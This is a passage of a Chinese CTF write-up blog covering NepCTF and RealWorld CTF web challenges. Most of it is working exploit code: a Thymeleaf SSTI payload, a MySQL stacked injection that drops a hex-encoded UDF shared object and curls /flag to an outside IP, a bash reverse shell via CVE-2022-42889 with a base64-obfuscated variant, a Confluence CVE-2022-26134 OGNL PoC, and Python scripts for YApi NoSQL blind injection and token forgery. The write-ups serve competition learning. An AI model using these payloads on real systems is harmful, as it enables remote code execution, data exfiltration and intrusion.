<pre><code class="hljs plaintext">eval?lang=__$%7Bnew java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;cat /flag&quot;).getInputStream()).next()%7D__::.x</code></pre>
<p><img src="http://img.hzy2003628.top/202207152349502.png" alt="image-20220715234918429"></p>
<p>NepCTF{b2d6a9bf-4f90-4abc-b5ae-9c07c4439ca5}</p>
<h2 id="博学多闻的花花">博学多闻的花花</h2>
<blockquote>
<p>坏女人要去参加CTF高考了，你能帮帮她嘛？(这个帮不得吧…)</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207170936068.png" alt="image-20220717093551450"></p>
<p>在my.cnf中看到是可以写进去so到plugin的，考虑是udf提权</p>
<p><img src="http://img.hzy2003628.top/202207170940483.png" alt="image-20220717094031422"></p>
<p>同时index.php界面用户注册之后存在堆叠注入<img src="http://img.hzy2003628.top/202207170940278.png" alt="image-20220717094006191"></p>
<p>payload</p>
<pre><code class="hljs plaintext">q1=1&amp;q2=2&amp;q3=3&amp;q4=4&amp;q5=5&#x27;);0x7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400 into dumpfile &#x27;/usr/lib64/mysql/plugin/hzy.so&#x27;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;hzy.so&#x27;;SELECT sys_eval(&#x27;curl http://43.138.40.212:4000 -d @/flag&#x27;);#</code></pre>
<pre><code class="hljs plaintext">vps外带数据
nc -lvnp 4000</code></pre>
<p><img src="http://img.hzy2003628.top/202207171027968.png" alt="image-20220717102715914"></p>
<p>NepCTF{CBF3BB22-D632-441D-A96D-405E0550A10F}</p>
<h2 id="qrcode-maker">QRCode Maker</h2>
<h1 id="pwn">pwn</h1>
<h2 id="全栈手">全栈手</h2>
<blockquote>
<p>阿毛给了H3一个C4炸弹，啪的一下很快啊，这个网站被炸了好几个洞 tips:本题目不提供附件 tips:附件通过源码泄露获取</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207172247341.png" alt="image-20220717224741049"></p>
<p>有个非预期解，是只需要会web就可以的，预期解的pwn我不会</p>
<p>首先存在一个目录穿越</p>
<p><img src="http://img.hzy2003628.top/202207172248135.png" alt="image-20220717224840055"></p>
<p>bp拦截得到key</p>
<p><img src="http://img.hzy2003628.top/202207172250238.png" alt="image-20220717225056161"></p>
<p>然后是ac4加密，直接解密就行</p>
<p><img src="http://img.hzy2003628.top/202207172251053.png" alt="image-20220717225134983"></p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>RW体验赛</title>
    <url>/2023/01/09/RW%E4%BD%93%E9%AA%8C%E8%B5%9B/</url>
    <content><![CDATA[<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230107155404246.png?x-oss-process=hzy" alt="image-20230107155404246" style="zoom:150%;">
<span id="more"></span>
<h1 id="be-a-language-expert">Be-a-Language-Expert</h1>
<p>TP6.0.12，利用文件包含写文件，然后进行包含</p>
<p>Flag无直接可读权限，readflag是elf文件，直接执行即可得到flag</p>
<p>rwctf{PHP_1s_Th3_B3st_L@ngvag3_1n_the_w0r1d}</p>
<h1 id="evil-mysql-server">Evil MySQL Server</h1>
<p>Mysql Server端伪造以致任意文件读取</p>
<p>用这个项目直接在vps建立一个server端</p>
<p><a href="https://github.com/allyshka/Rogue-MySql-Server">allyshka/Rogue-MySql-Server: MySQL fake server for read files of connected clients (github.com)</a></p>
<p>然后输入地址端口</p>
<p>查看log，信息已经返回到vps的log文件中</p>
<p>rwctf{d041bd251adb4380b3e1dea2bd355f8f}</p>
<h1 id="apachecommandtext">ApacheCommandText</h1>
<p>CVE-2022-42889，然后加了点过滤</p>
<p>使用base64decode绕过过滤反弹shell</p>
<p><a href="https://blog.csdn.net/whatday/article/details/107098353">(78条消息) java Runtime.getRuntime().exec 获取反弹shell_whatday的博客-CSDN博客_java runtime.getruntime().exec</a></p>
<pre><code class="hljs plaintext">$&#123;script:js:java.lang.Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/43.143.195.203/9999 0&gt;&amp;1&quot;)&#125;</code></pre>
<p>Base64编码</p>
<pre><code class="hljs plaintext">$&#123;base64Decoder:JHtzY3JpcHQ6anM6amF2YS5sYW5nLlJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMoIi9iaW4vYmFzaCAtYyAkQHxiYXNoIDAgZWNobyBiYXNoIC1pID4mL2Rldi90Y3AvNDMuMTQzLjE5NS4yMDMvOTk5OSAwPiYxIil9Cg==&#125;</code></pre>
<p>监听执行得到shell</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/clip_image017.png?x-oss-process=hzy" alt="img"></p>
<p>rwctf{rwctf_1terat1on_1s_4_g0od_des1gN_e5aa}</p>
<h1 id="be-a-wiki-hacker">Be-a-Wiki-Hacker</h1>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230107180205264.png?x-oss-process=hzy" alt="image-20230107180205264"></p>
<p>Confluence的CVE-2022-26134</p>
<p><a href="https://blog.csdn.net/weixin_48421613/article/details/125130838">(78条消息) CVE-2022-26134 Confluence远程命令执行漏洞复现_vlan911的博客-CSDN博客_confluence漏洞执行任意命令</a></p>
<p>Poc如下</p>
<pre><code class="hljs plaintext">/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat%20/flag%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/</code></pre>
<p>得到flag</p>
<p>rwctf{154fea37c0f14b519942931db23e89e8}</p>
<h1 id="yummy-api">Yummy Api</h1>
<p>Yapi 注入导致RCE</p>
<p>找到了类似文章</p>
<p><a href="https://mp.weixin.qq.com/s/mrm2goeLNlrIyWCYguEG0A">Yapi 注入到RCE 漏洞分析 (qq.com)</a></p>
<p>先跑下token，盲注</p>
<pre><code class="hljs plaintext">
import requests

strings = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;


def check_toekn(token:str):
    json_data = &#123;
        &#x27;token&#x27;: token,
        &#x27;catid&#x27;: &#x27;1376&#x27;,
        &#x27;path&#x27;: &#x27;/api/group/list&#x27;,
        &#x27;title&#x27;: &#x27;/api/group/list&#x27;,
        &#x27;method&#x27;: &#x27;GET&#x27;,
    &#125;
    response = requests.post(&#x27;http://47.98.161.119:8080/api/interface/add&#x27;,json=json_data)
    if response.text.find(&#x27;project_id&#x27;) == -1:
        print(&quot;token is &#123;0&#125;&quot;.format(token))
        exit()

payload = &quot;&quot;
while True:
    for i in strings:
        payloads = payload + i
        json_data = &#123;
            &#x27;token&#x27;: &#123;
                &#x27;$regex&#x27;: &#x27;^&#123;0&#125;&#x27;.format(payloads),
            &#125;,
            &#x27;catid&#x27;: &#x27;1376&#x27;,
            &#x27;path&#x27;: &#x27;/api/group/list&#x27;,
            &#x27;title&#x27;: &#x27;/api/group/list&#x27;,
            &#x27;method&#x27;: &#x27;GET&#x27;,
        &#125;
        response = requests.post(&#x27;http://47.98.161.119:8080/api/interface/add&#x27;,json=json_data)
        if response.text.find(&#x27;project_id&#x27;) != -1:
            continue
        else:
            payload = payloads
            print(payloads)
            check_toekn(payloads)
            break</code></pre>
<p>token is 8fa743801266b2391d16</p>
<p>因为uid是递增的所以直接爆破uid</p>
<pre><code class="hljs plaintext">from Crypto.Cipher import AES
from hashlib import md5
import requests

class AESCipher(object):
    class InvalidBlockSizeError(Exception):
        &quot;&quot;&quot;Raised for invalid block sizes&quot;&quot;&quot;
        pass

    def __init__(self, key, block_size=16) -&gt; None:
        if block_size &lt; 2 or block_size &gt; 255:
            raise AESCipher.InvalidBlockSizeError(
                &#x27;The block size must be between 2 and 255, inclusive&#x27;)
        self.block_size = block_size
        self.key, self.iv = self.EVP_BytesToKey(
            key.encode(&quot;utf-8&quot;), &quot;&quot;.encode(&quot;utf-8&quot;), 24, 16)

    def __pad(self, text) -&gt; str:
        text_length = len(text)
        amount_to_pad = self.block_size - (text_length % self.block_size)
        if amount_to_pad == 0:
            amount_to_pad = self.block_size
        self.pad = chr(amount_to_pad)
        return text + self.pad * amount_to_pad

    def __unpad(self, text) -&gt; str:
        text = text.rstrip(self.pad)
        return text

    def encrypt(self, raw) -&gt; str:
        raw = self.__pad(raw).encode()
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return cipher.encrypt(raw).hex()

    def decrypt(self, enc) -&gt; str:
        enc = bytes.fromhex(enc)
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return self.__unpad(cipher.decrypt(enc).decode(&quot;utf-8&quot;))

    def EVP_BytesToKey(self, password, salt, key_len, iv_len) -&gt; tuple[bytes, bytes]:
        &quot;&quot;&quot;
        Derive the key and the IV from the given password and salt.
        &quot;&quot;&quot;
        dtot = md5(password + salt).digest()
        d = [dtot]
        while len(dtot) &lt; (iv_len+key_len):
            d.append(md5(d[-1] + password + salt).digest())
            dtot += d[-1]
        return dtot[:key_len], dtot[key_len:key_len+iv_len]

aes = AESCipher(&quot;abcde&quot;, 16)
for i in range(0,100):
    token = aes.encrypt(&quot;&#123;0&#125;|8fa743801266b2391d16&quot;.format(i))
    reponse = requests.get(&quot;http://47.98.161.119:8080/api/project/get?token=&#123;0&#125;&quot;.format(token))
    if(reponse.text.find(&quot;null&quot;) == -1):
        print(&quot;uid:&#123;0&#125;&quot;.format(i))
        print(&quot;project_id:&#123;0&#125;&quot;.format(reponse.json()[&quot;data&quot;][&quot;_id&quot;]))
        print(token)
        exit()</code></pre>
<pre><code class="hljs plaintext">uid:11
project_id:66
043454c1c1399255295ebf2fff47e5cc494108968ad05f848627c334d91ad2bc</code></pre>
<p>然后直接用工具YApi-Exploit反弹数据到vps上</p>
<pre><code class="hljs plaintext">python3 exp.py -target http://47.98.161.119:8080 -action execute_command -id 66 -entoken 043454c1c1399255295ebf2fff47e5cc494108968ad05f848627c334d91ad2bc -cmd &quot;/readflag &gt;/tmp/1;curl http://x.x.x.x:8899 -d @/tmp/1&quot;</code></pre>
<p>得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230107220139641.png?x-oss-process=hzy" alt="image-20230107220139641"></p>
<p>rwctf{y0u_h4ve_f0und_yvmmy_@pi_f0r_c1ph3r_ch4ll3ng3s}</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SEETF</title>
